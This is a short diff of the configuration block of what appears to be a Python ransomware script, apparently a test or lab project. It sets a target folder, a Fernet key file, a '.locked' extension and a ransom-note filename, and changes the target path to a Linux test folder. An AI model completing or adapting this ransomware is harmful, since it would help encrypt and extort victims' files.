@@ -2,7 +2,7 @@ import os
 from cryptography.fernet import Fernet
 
 # ── CONFIG ────────────────────────────────────────────
-TARGET_DIR       = r"Ransomwares\Test Folder\Test"
+TARGET_DIR       = r"/home/hunter/Documents/tools/RANSOMWARE-FUMES/Test Folder/Test/"
 KEY_FILE         = "key.txt"
 LOCKED_EXTENSION = ".locked"
 NOTE_FILENAME    = "READ_ME.html"   # optional to delete afterward
